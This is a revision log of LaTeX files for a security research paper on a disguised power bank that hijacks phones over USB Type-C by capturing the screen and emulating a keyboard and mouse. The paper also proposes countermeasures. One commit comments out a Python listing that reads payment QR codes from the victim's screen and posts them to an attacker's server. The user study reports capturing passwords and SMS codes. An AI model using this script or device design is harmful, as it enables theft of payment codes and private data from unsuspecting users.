-Some composite anti-virus systems, like Windows Defender ATP\cite{windenfender} and Metascan\cite{OPSWAT} can sanitize the malicious files in the device to containment of any malware.
+Some composite anti-virus systems, like Metascan\cite{OPSWAT} can sanitize the malicious files in the device to containment of any malware.
 However, Metascan warned users to be wary of the device plugged into the computer, since there is currently no way to ensure absolutely security.

### 2021-01-19 WOOT/Files/experiment.tex
[experiment] user study

@@
 The USB Type-C hub adapts USB Type-C to a HDMI port and USB ports.
-
-\outline{Attack Modes}
+The USB Type-C hub is used to connect HID devices and transmit video stream from victim's device to HDMI port.
+The video stream then will be capture by the Raspberry Pi 4B through the video capture card.
 
@@
 
+\begin{figure}[hbtp]
+	\centering
+	\includegraphics[width=.4 \linewidth]{./Figs/Brick_station.png}
+	\includegraphics[width=.4 \linewidth]{./Figs/jiedian.jpg}
+	\caption{Two power banks station products}
+	\label{fig:PBS_products}
+\end{figure}
+
 \yechang{add hyperlink or reference to Brick's website or Brick App on App Store/Google Play.}
@@
 
+\begin{figure}[hbtp]
+	\centering
+	\includegraphics[width=\linewidth]{./Figs/qr_code_payment.png}
+	\caption{Bar/QR code payment procedure}
+	\label{fig:qr_payment_procedure}
+\end{figure}
+
 In the real-world, some payment service providers provide special rules for micropayments purchases.
@@
 It is worth noting that \tool exposed only a type-c cable (from USB Type-C hub),
-and \tool will charge his or her device through this cable, which has no difference from ordinary powerbanks.
+and \tool will charge his or her device through this cable, which has no difference from ordinary power banks.
 Noticed the low users' vigilance and high similarity between \tool and normal power bank, the attacker can return his/her modified power bank (as \tool) to a power bank station, mixing \tool into the circulation of shared power banks.
@@
 Like many outdoor mobile phone usage scenarios, the victim may complete payment with showing payment code.
-In this process, the attacker can preemptively extract and use the victim's payment code to make another payment.
-\yechang{tired, go to bed}
+In this process, the attacker can preemptively extract and use the victim's payment code to make another payment unknown to the victim, which threatens victim's property.
 
-\subsection{evaluation}
+\subsection{User study}
+
+In order to check what can be obtained by \tool, we conduct a user study in order to check the performance of \tool in Privacy extraction mode.
+
+\subsubsection{Setup}
+
+\subsubsection{Scenario}
+
+We invited 6 volunteers to our lab room.
+Volunteers take turns to operate their phones for half an hour while \tool is connected.
+Before the study, we did not reveal the function of \tool and asked the volunteers to connect their phones to \tool as a normal power bank (ignoring its larger size).
+After the study, we told them our attack, checked recorded videos together, and confirmed the consent to study the information in recorded videos, Subject to efficiency reasons, we ask them to use phones like when they use the shared power bank outside.
+
+\subsubsection{Result}
+
+After collecting the videos, we used both automatic and manual methods to analyze the video.
+In the automatic analysis, we use a script to simply perform OCR recognition to each frame in the recorded video and store all OCR results into a database in a format of ``frame number - text by OCR''.
+At last, there are 38329 pieces of data collected among 6 volunteers.
+In the manual analysis, we replay the recorded video and extract sensitive information manually.
+
+In terms of automatic analysis, OCR results of all frames are already stored in the database and can be used at hand.
+With these results, we can learn what issues the victim is browsing.
+Additionally, some keywords often appear with users' input data because they are often used as labels of input boxes, such as ``account'', ``username''.
+Such keywords are more likely to lead us to discover user-specific data.
+For example, in Figure~\ref{fig:ocr_keyword_example}, searching with ``account'' as the keyword, victim's accounts can be detected as shown in Fig.
+The frame number is the position of this frame in the recorded video, which indicates a target for manual analysis for further data extraction.
+
+\begin{figure}[hbtp]
+	\centering
+	\includegraphics[width=\linewidth]{./Figs/ocr_keyword_example.png}
+	\caption{Search ``account'' in all OCR results}
+	\label{fig:ocr_keyword_example}
+\end{figure}
+
+In terms of manual analysis, data collected are listed in table ~\ref{table:information_extracted}.
+Accounts of internet applications such as Apple ID, iCloud, Facebook, Twitter, WeChat, QQ, Alipay can be obtained.
+Additionally, all typing inputs are on the virtual keyboard (including the system keyboard and the built-in security keyboard of the financial app), which can be clearly recorded.
+Noticed that, we can obtain the plain text of password typed such as the WiFi password and the Alipay password.
+Furthermore, the received SMS verification code (usually is used to confirm real-name authentication) can be obtained when it appears in the top notification bar.
+
+In summary, we can no longer directly peek at the user’s password on the lock screen.
+But if the user unconsciously unlocks the screen, we can still check all information presented on the screen, extract private information including but not limited to social accounts, bank accounts, personal financial situation, etc.
+It is worth noting that the so-called secure keyboards built into some financial apps just simply disrupt the keyboard sequence and cannot prevent attacks similar to \tool.
 

### 2021-01-20 WOOT/Files/related_work.tex

@@
 Pham et al.
-\cite{pham2010optimizing}, Metascan \cite{OPSWAT} and odix\cite{OLEA} propose scanning function for files on portable USB devices, and can prevent malicious code over malicious devices from attacking host.
-There are also some work like TMSUI\cite{yang2015tmsui} USB
-Unix Smart Blocker\cite{diwan2014complete}, which based on the unreliable information provided by USB devices during enumeration to defend against BadUSB attack.
+\cite{pham2010optimizing} and odix\cite{OLEA} propose scanning function for files on portable USB devices, and can prevent malicious code over malicious devices from attacking host.
+There are also some work like TMSUI\cite{yang2015tmsui}, which based on the unreliable information provided by USB devices during enumeration to defend against BadUSB attack.
 
@@
 However, Metascan warned users to be wary of the device plugged into the computer, since there is currently no way to ensure absolutely security.
+
+For those attacks that use the usb cable to peek at the device screen while the user is charging the mobile device, Meng et al\cite{meng2018252} detect potential attacks by analyzing changes in the usage of CPU and GPU.
+
+~\ref{table:ccc}
+\begin{table*}
+	\centering
+	\begin{tabular}{|c|c|c|c|c|c|c|}
+
+		\hline
+		\diagbox {Defence}{Attack} & Rubbery Ducky\cite{rubber}, \cite{rubberducky2020},USBderivery\cite{usbdriver} & Duqu\cite{duqu} & JFC\cite{JFCImpact}&\cite{smartphone}\cite{poweremi} and \cite{usbdriver}& Armory\\
+
+		\hline 
+		USB condom \cite{Condom}& yes & yes & yes & yes & yes\\
+		\hline 
+		Pham et al. \cite{pham2010optimizing}, odix\cite{OLEA}& no & ? & no & no & no\\
+		\hline 
+		TMSUI\cite{yang2015tmsui}& no & yes? & no & no & no\\
+		\hline 
+		Windows Defender ATP\cite{windenfenderwhite}& no & yes? & no & no & no\\
+		\hline 
+		GoodUSB\cite{tian2015defending}& yes & yes & yes? & no & no \\
+
+		\hline
+		Neuner et al.\cite{neuner2018usblock}& yes & no & no & no & depends? \\
+		\hline
+		Meng et al\cite{meng2018252}& no & no & yes & no & ?\\
+		\hline
+	\end{tabular}
+	\linebreak
+	\caption{Effectiveness of defense against different attacks}
+	\label{table:ccc}
+\end{table*}

### 2021-01-20 WOOT/Files/related_work.tex
remove of mode comparison, fix effective table

@@
 
-~\ref{table:ccc}
+We summarize the former effort in USB attack and defense in Table~\ref{table:attack_vs_defense}, which illustrated the effectiveness of each defense against various attacks including our \tool.
 \begin{table*}
@@
 		\hline 
-		USB condom \cite{Condom}& yes & yes & yes & yes & yes\\
+		USB condom \cite{Condom}& Yes & Yes & Yes & Yes & Yes\\
 		\hline 
-		Pham et al. \cite{pham2010optimizing}, odix\cite{OLEA}& no & ? & no & no & no\\
+		Pham et al. \cite{pham2010optimizing}, odix\cite{OLEA}& No & ? & No & No & No\\
 		\hline 
-		TMSUI\cite{yang2015tmsui}& no & yes? & no & no & no\\
+		TMSUI\cite{yang2015tmsui}& No & Yes? & No & No & No\\
 		\hline 
-		Windows Defender ATP\cite{windenfenderwhite}& no & yes? & no & no & no\\
+		Windows Defender ATP\cite{windenfenderwhite}& No & Yes? & No & No & No\\
 		\hline 
-		GoodUSB\cite{tian2015defending}& yes & yes & yes? & no & no \\
+		GoodUSB\cite{tian2015defending}& Yes & Yes & Yes? & No & No \\
 
 		\hline
-		Neuner et al.\cite{neuner2018usblock}& yes & no & no & no & depends? \\
+		Neuner et al.\cite{neuner2018usblock}& Yes & No & No & No & depends? \\
 		\hline
-		Meng et al\cite{meng2018252}& no & no & yes & no & ?\\
+		Meng et al\cite{meng2018252}& No & No & Yes & No & ?\\
 		\hline
@@
 	\caption{Effectiveness of defense against different attacks}
-	\label{table:ccc}
+	\label{table:attack_vs_defense}
 \end{table*}

### 2021-01-20 WOOT/Files/experiment.tex
exp,coutermeasure,util
Remove cv code

@@
 Besides, \tool can use ``opencv'' to detect and decode QR codes or barcodes shown on the victim's device, which is expected to extract payment code information in payment apps.
-Here is an example of extracting payment code with opencv library in listing~\ref{lst2:qr},
+Here is an example of extracting payment code with opencv library in listing. \shuqing{Need to be modified.}
 
@@
 
-\begin{lstlisting}[caption={python script for extracting payment code of victim},label=lst2:qr]
-import cv2, qrcode,requests
-import pyzbar.pyzbar as pyzbar
-def decodeDisplay(video):
-    gray = cv2.cvtColor(video, cv2.COLOR_BGR2GRAY)
-    barcodes = pyzbar.decode(gray)
-    for barcode in barcodes:
-        barData = barcode.data.decode()
-        barType = barcode.type
-        requests.post('<server of attacker>',
-            data={
-                'data': barData,
-                'type': barType
-            }
-        )
-if __name__ == '__main__':
-    cam = cv2.VideoCapture(0)
-    while True:
-        ret, frame = cam.read()
-        decodeDisplay(frame)
-        if cv2.waitKey(5) == 27:
-            break
-    cam.release()
-    cv2.destroyAllWindows()
-\end{lstlisting}
+%\begin{lstlisting}[caption={python script for extracting payment code of victim},label=lst2:qr]
+%import cv2, qrcode,requests
+%import pyzbar.pyzbar as pyzbar
+%def decodeDisplay(video):
+%    gray = cv2.cvtColor(video, cv2.COLOR_BGR2GRAY)
+%    barcodes = pyzbar.decode(gray)
+%    for barcode in barcodes:
+%        barData = barcode.data.decode()
+%        barType = barcode.type
+%        requests.post('<server of attacker>',
+%            data={
+%                'data': barData,
+%                'type': barType
+%            }
+%        )
+%if __name__ == '__main__':
+%    cam = cv2.VideoCapture(0)
+%    while True:
+%        ret, frame = cam.read()
+%        decodeDisplay(frame)
+%        if cv2.waitKey(5) == 27:
+%            break
+%    cam.release()
+%    cv2.destroyAllWindows()
+%\end{lstlisting}
 
@@
 
-\begin{table*}
+\begin{table*}[hbtp]
 	\centering

### 2021-01-21 WOOT/Files/badusb.tex
remove of mode comparison, fix effective table
Figures
Some comments about figures
impl revision

@@
 In this section, we first introduce the hardware components we used to build \tool, then we focus on the three different attack modes we implement  for various scenario.
-The comparison of these modes is available at Table~\ref{table:mode_comparison}
-\begin{table*}
-	\centering
-	\begin{tabular}{|c|c|c|c|c|}
-	\hline
-	Mode & Detectibility & Automation & Power Consumption  \\
-	\hline
-	Scripting & Medium & Yes & Low\\
-	\hline
-	Remote Control & High & No & High \\
-	\hline
-	Privacy Extraction & Low & Yes & Medium\\
-	\hline
-	\end{tabular}
-	\linebreak
-	\caption{Comparison of Different Mode}
-	\label{table:mode_comparison}
-\end{table*}
 
@@
 	\item\textit{USB 3.x Hub} exports the USB 3.x connector into various ports, like DisplayPort, USB 2.0 port etc.
-	\item\textit{Video Capture Card} convert DisplayPort signal into UVC-compatible\hongyi{citation needed} data, which is later processed by Raspberry Pi.
+	\item\textit{Video Capture Card} convert DisplayPort signal into UVC-compatible\hongyi{citation needed} data, which is later processed by embedded computer.
 	\item\textit{Single Board Computer} processes video stream from the victim where private data is extracted and transmitted through GSM/WiFi.
-	\item\textit{HID Emulator} emulates HID device which can be controlled from either the embedded Raspberry Pi or the attacker.
+	\item\textit{HID Emulator} emulates HID device which can be controlled from either the embedded computer.
 \end{itemize}
-\begin{figure}[hbtp]
-	\includegraphics[width=\linewidth]{./Figs/attack_model.png}
-	\caption{Attack Model}
+\begin{figure}[t]
+	\centering
+	\includegraphics[width=0.75\linewidth]{./Figs/attack_model.png}
+	\caption{Attack Model}\shuqing{Need to be more compact.}
 	\label{fig:attack_model}
 \end{figure}
-\textbf{Scripting Mode}
-\tool under this mode works almost the same like the original Rubber Ducky with various improvement.
+\textbf{Scripting Mode} This mode majorly relies on the ``HID Emulator'' to send constructed HID packet to the victim.
+These constructed HID packet will be interpreted by the victim as valid key strokes and mouse moves.
+Thus the attacker can executes arbitrary scripts on the victim's device.
+This is the function of the original BadUSB.
+Based on this, we made the following improvement.
 
@@
 But such defense mechanism needs visual notification to request authentication for unknown USB device.
-This means that when the defense request authentication from the user, our \tool is able to capture the content of authentication challenge and complete it automatically or manually.
+This means that when the defense request authentication from the user, our \tool is able to capture the content of authentication challenge and complete it.
 After the defense is bypassed, \tool continues the emulation and script execution, resulting a successful attack.
 
-As the mouse relies on the visual feedback to work properly, its emulation and automation were not supported by the original version of Rubber Ducky.
+Moreover, as the mouse relies on the visual feedback to work properly, its emulation and automation were not supported by the original version of Rubber Ducky.
 Yet with the video output support from USB 3.x, our \tool implements full-functional mouse emulation.
@@
 
+\textbf{Privacy Extraction Mode}
+\tool under this mode does not emulate other USB device and solely relies on the video stream function of USB 3.x and use ``Video Capture'' component to deliver the stream to the embedded computer.
+The victim's device will mistakenly treat \tool as a external monitor and try to output its video stream.
+This stream is latter processed by the embedded computer to extract private data.
+
+When running in this mode, \tool passively process the victim's video stream and detect for ``valuable'' private data.
+Here, a data is ``valuable'' or not is decided by a customized detector, we implement a simple payment code detector for demonstration purpose.
+Though this detector is simple to implement, we successfully transfer money from the victim.
+More detail can be obtained in Section~\ref{sec:experiment}.
+
+It is worth mentioning that \tool under this mode is completely passive, making it hard to be detected and defended.
+With different detector implemented, \tool under this mode is capable of serving more purpose.
+
 \textbf{Remote Control Mode}
-In \tool, we implement all components required to operate a computer/mobile remotely, including a video stream, keyboard/mouse emulation.
+In \tool, we have implemented all components required to control a computer/mobile remotely, including a video stream, keyboard/mouse emulation.
+Thus with all components enabled, not only will the victim's device treat \tool as a external display, but also a valid HID input source.
+Hence we can archive complete hijack of victim's device.
 
@@
 The advantage of this mode is that it can completely hijack the victim device. But this complete control also comes with the price of high power consumption and risk of being detected by the user.
-
-\textbf{Privacy Extraction Mode}
-\tool under this mode does not emulate other USB device and solely rely on the video stream function of USB 3.x.
-
-When running in this mode, \tool passively process the victim's video stream and detect for ``valuable'' private data.
-Here, a data is ``valuable'' or not is decided by a customized detector, we implement a simple one of payment code for demonstration purpose.
-Though this detector is simple to implement, we successfully transfer money from the victim.
-More detail can be obtained in Section~\ref{sec:experiment}.
-
-It is worth mentioning that \tool under this mode is completely passive, making it hard to be detected and defended.
-With different detector implemented, \tool under this mode is capable of serving more purpose.
-
-Though \tool under this mode is least detectable, \tool is also unable to fetch any information actively. All the video stream has to be analyzed and filtered to become usable private information.

### 2021-01-21 WOOT/Files/countermeasure.tex
[countermeasure] rm comment
exp,coutermeasure,util
Some comments about figures
minor revision of intro

@@
 \section{Countermeasures}
-\yechang{Feng Liang says Andriod or iOS can provide an API to render private information only on onboard screen (like iPad OS)}
-
 \label{sec:countermeasures}
@@
 
-\textbf{Isolated UI Rendering}
-During our experiment, we noticed that \tool is actually unable to redirect out the locking screen keyboard from the iPad OS.
-Instead, the keyboard is only available on the internal display.
-However, this defense is only enabled on the locking screen keyboard, other virtual keyboard is still vulnerable to our \tool.
-This mechanism has inspired us to propose a new defense against our \tool.
-If the OS provider like Apple/Google can implement a more generalized \emph{isolated UI rendering} that allows developer to decide whether a content is ``sensitive'' and where it should be rendered.
-To better illustrate this countermeasure idea, we drew the Figure~\ref{fig:isolated_ui}.
-In that figure, the password keyboard is set to be ``sensitive'' component while the other parts of the UI is not.
-Thus the renderer will only render the password keyboard on the trusted internal display and prevent untrusted external display like \tool to obtain sensitive data.
-We believe this is a promising way to defend users from attack like juice filming and our \tool.
-\begin{figure}[htbp]
-	\includegraphics[width=\linewidth]{./Figs/isolated_ui.png}
-	\caption{Isolated UI Rendering}
-	\label{fig:isolated_ui}
-\end{figure}
-
 \textbf{Distrust-by-Default.}
@@
 Thus this strict policy is far from optimal in most use cases.
+
+\textbf{Isolated UI Rendering}
+During our experiment, we noticed that \tool is actually unable to redirect out the locking screen keyboard from the iPad OS.
+Instead, the keyboard is only available on the internal display.
+However, this defense is only enabled on the locking screen keyboard, other virtual keyboard is still vulnerable to our \tool.
+This mechanism has inspired us to propose a new defense against our \tool called \emph{Isolated UI Rendering}.
+As illustrated in Figure~\ref{fig:isolated_ui}, we designed two separated UI render driver, one is secure the other is insecure.
+When an application require to render, it can pass the content along with a tag identifying whether the content is ``sensitive'' or not.
+If the content is tagged with ``sensitive'', then the OS will only pass it to the secure driver, which only trusts the internal display.
+On the other hand, if the content is tagged with ``insensitive'', then it will be passed to both secure and insecure driver, rendered on both internal and external display.
+\begin{figure}[htbp]
+	\centering
+	\includegraphics[width=\linewidth]{./Figs/isolated_ui.png}
+	\caption{Isolated UI Rendering}\shuqing{Maybe we can increase the font?}
+	\label{fig:isolated_ui}
+\end{figure}
+
+\begin{algorithm}[H]
+	\SetAlgoLined
+	\KwData{Application UI Content}
+	\For{component C in content}{
+		\eIf{C.tag is sensitive}{
+			Send $C$ to secure driver
+		}{
+			Send $C$ to both drivers
+		}
+	}
+	\caption{Isolated UI Render}
+\end{algorithm}

### 2021-01-21 WOOT/Files/introduction.tex
minor revision of intro

@@
 On the other side of the coin, the security of USB has caused serious problems.
-The designers of USB protocol didn't care much about security issues as they wanted to make a trusted protocol.
+The designers of USB protocol did not care much about security issues as they wanted to make a easy-to-use protocol.
 There are more than four hundred vulnerabilities referencing USB on CVE list~\cite{website:CVE-list}.
-As a result, lots of attackers make use of these vulnerabilities and the \textit{trust-by-default} characteristics of USB to conduct attacks, which puts the privacy and financial security of USB users in danger~\cite{sok}.
+As a result, many attackers exploit these vulnerabilities and the \textit{trust-by-default} characteristics of USB to conduct attacks, which puts the privacy and financial security of USB users in danger~\cite{sok}.
 
@@
 These attacks are conducted through modification of the device firmware, which will disguise normal USB devices as other types of devices that are \textit{trust-by-default} by the hosts.
-Typical simulated devices include human interface devices (short for HID, including keyboards, mice, etc.) and disks.
-Utilizing BadUSB, attackers can pretend themselves as normal users, such as typing malicious code to victim computers, downloading and executing malicious scripts, and copying out private data from disks.
-Such attacks can easily escape from traditional anti-virus software, since it is very hard to distinguish them with normal usage.
+Typical simulated devices include HID (short for human interface devices, including keyboards, mice, etc.) and disks.
+Utilizing BadUSB, attackers can pretend themselves as normal users, typing malicious code to victim computers, downloading and executing malicious scripts, and copying out private data from disks.
+Such attacks can easily escape from traditional anti-virus software, since it is very hard to distinguish them from normal USB devices.
 
@@
 (1) Attackers can't conduct attacks precisely, which decreases the capabilities of BadUSB attacks.
-While performing attacks on another host, the attackers can neither know the current user interface (UI) status nor obtain the consequences of their attacking actions to take subsequent moves.
+When performing attacks on another host, the attackers can not obtain the current user interface (UI) status which limits them from taking subsequent moves.
 For example, it is hard for attackers to locate specific functional UI patterns like buttons and links on victim computers by disguising USB devices as mice.
 That explains why typical BadUSB attacks often only stay in command line, using commands to download malicious scripts for execution.
-However, these attacks may be intercepted by anti-virus software or firewall due to the usage of network.
+However, these attacks may be intercepted by anti-virus software or firewall due to the usage of host network.
 (2) To our best knowledge, existing BadUSB attacks only utilize the features of USB 2.0.
-The releasing of USB 3.0 makes USB more powerful, with a higher transmission rate for data and the support towards a larger range of devices including DisplayPort, HDMI, PowerDelivery, etc.
+The releasing of USB 3.0 makes USB more powerful, with a higher transmission rate for data and the support towards a larger range of peripherals including DisplayPort, HDMI, PowerDelivery, etc.
 BadUSB attacks can become more effective with the help of USB 3.0.
@@
 \tool extends BadUSB to support the features of USB Type-C.
-Since USB Type-C is capable to transfer video steaming data, \tool could obtain the information of victim's graphical interface during attacks.
+Since USB Type-C is capable to transfer video stream data, \tool could obtain the information of victim's graphical interface during attacks.
 Combining it with simulation of traditional HIDs like keyboards and mice, attackers can perform precise attacks.

### 2021-01-21 WOOT/Files/related_work.tex
REVISION OF RELATED WORK

@@
 
-In this part, we survey related works on USB attack in Section III-A, and USB defence security in Section III-B, respectively.
+In this part, we survey related works on USB attack in Section~\ref{subsec:usb_attack}, and USB defence security in Section \ref{subsec:usb_defence}, respectively.
 
 \subsection{USB Attack}
-While many USB based attacks have been developed, these attacks are all tied to the environment of the target devices.
-In addition, limited to the USB 2.0\cite{usb20} specification, there is no video transformation interface, the control of attack processing is impossibly handled by the attackers without additional processing signal received.
+\label{subsec:usb_attack}
+While many USB based attacks have been proposed, these attacks are all tied to the environment of the target devices.
+In addition, limited to the USB 2.0\cite{usb20} specification, there is no video transferring interface, the control of attack processing is impossibly handled by the attackers without additional processing signal received.
 One way is to masquerade protocol of attack devices, e.g., Rubbery Ducky\cite{rubber},\cite{badusb}, \cite{rubberducky2020}, \cite{usbbypassing}, \cite{iseeyou}and USBderivery\cite{usbdriver}, when they are connected to the host, they will hide their own functionality with the re-write functionality interface, that works because of the HID enumeration property for USB identifying.
@@
 \subsection{USB Defence Security}
+\label{subsec:usb_defence}
 There are already some defenses against BadUSB attacks. 

### 2021-01-21 WOOT/Files/related_work.tex
REVISION OF RELATED WORK

@@
 While many USB based attacks have been proposed, these attacks are all tied to the environment of the target devices.
-In addition, limited to the USB 2.0\cite{usb20} specification, there is no video transferring interface, the control of attack processing is impossibly handled by the attackers without additional processing signal received.
-One way is to masquerade protocol of attack devices, e.g., Rubbery Ducky\cite{rubber},\cite{badusb}, \cite{rubberducky2020}, \cite{usbbypassing}, \cite{iseeyou}and USBderivery\cite{usbdriver}, when they are connected to the host, they will hide their own functionality with the re-write functionality interface, that works because of the HID enumeration property for USB identifying.
-Software running on the host will exfiltrate data or receive commands via the RF interface in \cite{turnip} after modified the USB table with an additional RF transmitter.
-What is more, the host's USB software stack generally expects devices to confirm the USB standard, \cite{facedancer} and \cite{syzkaller} take a number of vulnerabilities to the kernel-model with the help of fuzzing technology.
-These attacks are all using the vulnerabilities of the protocol of USB, but due to the limitations of USB 2.0, there are no port for video transformation in the devices with USB 2.0, so it is impossible to handle the real-time screen information of the host, only environment fitted commands and scripts will work in these scenarios, as well as the attack time.
+In addition, limited to the USB 2.0\cite{usb20} specification, there is no video transferring interface, the control of attack processing is impossibly handled by the attackers without additional processing signal received.\hongyi{What?} One way is to masquerade protocol of attack devices, e.g., Rubbery Ducky \cite{rubber},\cite{badusb}, \cite{rubberducky2020}, \cite{usbbypassing}, \cite{iseeyou}and USBderivery\cite{usbdriver}, when they are connected to the host, they will hide their own functionality with the re-written firmware, that works because of HID enumeration does not verify the firmware of devices.
+Software running on the host will exfiltrate data or receive commands via the RF interface in \cite{turnip} after modifying the USB table as an additional RF transmitter.
+What is more, the host's USB software stack generally expects devices to confirm the USB standard, \cite{facedancer} and \cite{syzkaller} take a number of vulnerabilities to the kernel-model with the help of fuzzing technique.
+These attacks are all using the vulnerabilities of USB protocol, but due to the limitations of USB 2.0, there are no port for video transferring in the devices with USB 2.0, so it is impossible to obtain the real-time screen information of the host, only environment fitted commands and scripts will work in these scenarios.
 
@@
 \cite{webcam}, \cite{malware},\cite{audioextraction}, \cite{usbee}, and \cite{turnip} used the property that USB devices often do not authenticate the communicating application on the host, they send or receive sensitive data to or from the host devices.
-Due to the limitation of functionality interface of devices for video transformation, the accuracy timing for wake up the devices is difficult to handle, e.g., executing the malicious code in host's free time, pause the execution processing in the inappropriate time.
+Due to the limitation of functionality interface of devices in video transmitting, the accuracy timing for wake up the devices is difficult to handle, e.g., executing the malicious code in host's free time, pausing the execution in the inappropriate time.
 
@@
 With this approach, it is able to successfully exfiltrate data without the permission on user's side.
-Due to the limitation of MHL standard, only data exfiltrating without other attack script works here, an additional conversion tool is necessary.
-Others attacks for USB to exfiltrate data\cite{smartphone}, \cite{poweremi},\cite{revealing}, \cite{su2017usb}, \cite{usbgpslocator}, \cite{bates2014leveraging}, \cite{badusbhub}, \cite{usbfinger}, \cite{side}, \cite{usbdriver} are to eavesdrop signal to recovered the sensitive data at the physical layer.
+Due to the limitation of MHL standard, only data exfiltrating works here, an additional conversion tool is necessary.
+Other attacks for USB to exfiltrate data\cite{smartphone}, \cite{poweremi},\cite{revealing}, \cite{su2017usb}, \cite{usbgpslocator}, \cite{bates2014leveraging}, \cite{badusbhub}, \cite{usbfinger}, \cite{side}, \cite{usbdriver} are to eavesdrop signals to recover the sensitive data at the physical layer.
 In a similar way, \cite{usbkiller}, \cite{cable}, \cite{usbee}, \cite{turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
-Even though the data, including the video data, could be recovered in this way, these attacks for executing malicious code is difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.
+Even though the data, including the video data, could be recovered in this way, these attacks for executing malicious code is too difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.
 
@@
 \label{subsec:usb_defence}
-There are already some defenses against BadUSB attacks. 
-And there has been a comprehensive investigation of previous work.\cite{sok}.
+There are already many defenses proposed against BadUSB attacks and a comprehensive investigation of previous work.\cite{sok}.
 BadUSB attack requires `D-' and `D+' which have been defined by USB protocol since USB 1.0\cite{usb10},
-without these special pins, data can't be transferred in the USB cable.
-USB condom \cite{Condom} proposed a hardware-based solution to prevent data from being transmitted on data channel by adding special hardware between the usb device and host.
-At this case, `D-' and `D+' are disabled.
-However, this method poses a great challenge to ease of use, and once deployed, it will block all USB-supported advanced functions other than charging.
+without these pins, data can't be transferred via USB cable.
+USB Condom \cite{Condom} proposed a hardware-based solution to prevent data from being transmitted on data channel by adding special hardware between the USB device and host.
+In this case, `D-' and `D+' are disabled.
+However, this method poses a great challenge to easy-to-use property, and once deployed, it will block all USB functions other than charging.
 Pham et al.
-\cite{pham2010optimizing} and odix\cite{OLEA} propose scanning function for files on portable USB devices, and can prevent malicious code over malicious devices from attacking host.
-There are also some work like TMSUI\cite{yang2015tmsui}, which based on the unreliable information provided by USB devices during enumeration to defend against BadUSB attack.
+\cite{pham2010optimizing} and odix\cite{OLEA} propose scanning function for files on portable USB devices, and can prevent malicious code from attacking host.
+There are also some work like TMSUI\cite{yang2015tmsui}, which is based on the unreliable information provided by USB devices during enumeration to defend against BadUSB attack.
 
 Since USB devices may hide their real functionality from the user.
-GoodUSB\cite{tian2015defending} will report the functionality and identity information of the device to the user and the user needs to explicitly specify the target functionality of the device.
+GoodUSB\cite{tian2015defending} will report the functionality and identity of the device to the user and the user needs to explicitly authorize.
 On this basis, GoodUSB loads the corresponding driver for the device, and device can not request other drivers during enumeration or usage.
-This restricts the device from loading only the drivers allowed by the user, but does not prevent the device from using available drivers to attack.
+This restricts the device to load only the drivers allowed by the user, but does not prevent the device from using available drivers to attack.
 For example, a malicious keyboard can type commands without the user's knowledge after enumeration.
-Because from the user's perspect, he must permit a USB-based keyboard the corresponding drivers to allow himself to use keyboard to type, but once the drivers are loaded, the malicious usb-based keyboard can also automatically type commands.
-What's more, in GoodUSB, VM is deployed in host to interact with the USB device to detect malicious behavior like automatic eqxecution of malicious code.
+Because from the user's perspective, he must permit a USB-based keyboard the corresponding drivers to allow himself to authorize, but once the drivers are loaded, the malicious USB-based keyboard can also automatically type in commands.
+What's more, in GoodUSB, VM is deployed in host to interact with the USB device to detect malicious behavior like automatic execution of code.
 
-Windows Defender ATP\cite{windenfenderwhite} can maintain a white list of USB devices, only if one USB device is in the white list can it interact with host.
+Windows Defender ATP\cite{windenfenderwhite} maintains a whitelist of USB devices, only if one USB device is in the white list can it interact with host.
 This prevents all interactions between untrusted devices and the host.
-But this reduces the ease of use and requires users to have a certain safety awareness.
-For example, a naive user may add the USB device he found outdoors to his whitelist without precautions.
-Mohammadmoradi et al\cite{mohammadmoradi2018making} generate unique fingerprint based on the features and functions of the USB device, thereby building a whitelist of USB devices.
+But this reduces the easy-to-use property and requires users to have a certain safety awareness.
+For example, a naive user may add the USB device he/she found outdoors to his/her whitelist without precautions.
+Mohammadmoradi et al\cite{mohammadmoradi2018making} propose generating unique fingerprint based on the features and functions of the USB device to build such a whitelist.
 
-Neuner et al.\cite{neuner2018usblock} prevent USB key injection attacks from malicious flash drive by analyze temporal characteristics of BadUSB-like attacks.
-This defense mechanism can be successful because the attacker cannot obtain the screen of the host based on the BadUSB under USB2.0, so that the malicious device can only inject instructions in a very short time to prevent the user from discovering.
-This causes the typing characteristics of BadUSB devices to be detected.
+Neuner et al.\cite{neuner2018usblock} prevent USB key injection attacks from malicious flash drive by analyzing temporal characteristics of BadUSB-like attacks.
+This defense mechanism is successful as the attacker cannot obtain the screen of the host using BadUSB, so that the malicious device can only inject instructions in a very short time to prevent the user from discovering.
+This causes the typing characteristics of BadUSB devices to be abnormal and detectable.
 
-Some composite anti-virus systems, like Windows Defender ATP\cite{windenfender} and Metascan\cite{OPSWAT} can sanitize the malicious files in the device to containment of any malware.
+Some composite anti-virus systems, like Windows Defender ATP\cite{windenfender} and Metascan\cite{OPSWAT} can sanitize the malicious files in the device to stop malware.
 However, Metascan warned users to be wary of the device plugged into the computer, since there is currently no way to ensure absolutely security.
 
-For those attacks that use the usb cable to peek at the device screen while the user is charging the mobile device, Meng et al\cite{meng2018252} detect potential attacks by analyzing changes in the usage of CPU and GPU.
+For those attacks that use the USB cable to peek at the device screen while the user is charging the mobile device, Meng et al\cite{meng2018252} detect potential attacks by analyzing changes in the usage of CPU and GPU.
 

### 2021-01-21 WOOT/Files/related_work.tex
defence dcg

@@
 There are already many defenses proposed against BadUSB attacks and a comprehensive investigation of previous work.\cite{sok}.
-BadUSB attack requires `D-' and `D+' which have been defined by USB protocol since USB 1.0\cite{usb10},
-without these pins, data can't be transferred via USB cable.
+BadUSB attack requires `D-' and `D+' which have been defined by USB protocol since USB 1.0\cite{usb10}.
+Without these pins, data can't be transferred via USB cable.
 USB Condom \cite{Condom} proposed a hardware-based solution to prevent data from being transmitted on data channel by adding special hardware between the USB device and host.
-In this case, `D-' and `D+' are disabled.
+This hardware can cut off the `D-' and `D+' and allow only power pins.
 However, this method poses a great challenge to easy-to-use property, and once deployed, it will block all USB functions other than charging.
-Pham et al.
-\cite{pham2010optimizing} and odix\cite{OLEA} propose scanning function for files on portable USB devices, and can prevent malicious code from attacking host.
+
+Under the premise of ensuring the normal operation of all USB pins, some work improve the security of connection establishment.
+Windows Defender ATP\cite{windenfenderwhite} maintains a whitelist of USB devices, only if one USB device is in the whitelist can it interact with host through data channel.
+This prevents all interactions between untrusted devices and the host.
+But this requires users to have a certain safety awareness.
+For example, a naive user may add the USB device from unknown sources to his/her whitelist without precaution.
